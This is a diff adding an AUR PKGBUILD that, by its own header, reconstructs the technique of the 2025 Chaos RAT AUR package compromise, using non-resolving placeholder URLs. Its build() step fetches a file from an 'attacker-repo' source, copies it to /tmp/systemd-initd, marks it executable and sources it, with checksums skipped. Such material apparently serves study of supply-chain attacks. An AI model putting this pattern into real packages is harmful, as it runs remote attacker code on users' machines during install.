@@ -1,0 +1,26 @@
+# Synthetic reconstruction of the 2025 librewolf-fix-bin/firefox-patch-bin Chaos RAT
+# AUR incident technique. See SOURCE.md -- this is NOT the original malicious code,
+# and the URLs below are non-resolving placeholders.
+pkgname=librewolf-fix-example-bin
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Example reconstruction of a compromised orphaned AUR package"
+arch=('x86_64')
+url="https://example.invalid/librewolf-fix-example"
+license=('MPL2')
+source=("https://example.invalid/$pkgname-$pkgver.tar.gz"
+        "patches::https://example.invalid/attacker-repo.git")
+sha256sums=('SKIP'
+            'SKIP')
+
+build() {
+  cd "$srcdir"
+  cp patches /tmp/systemd-initd
+  chmod +x /tmp/systemd-initd
+  source patches
+}
+
+package() {
+  cd "$srcdir/$pkgname-$pkgver"
+  install -Dm755 librewolf-fix "$pkgdir/usr/bin/librewolf-fix"
+}
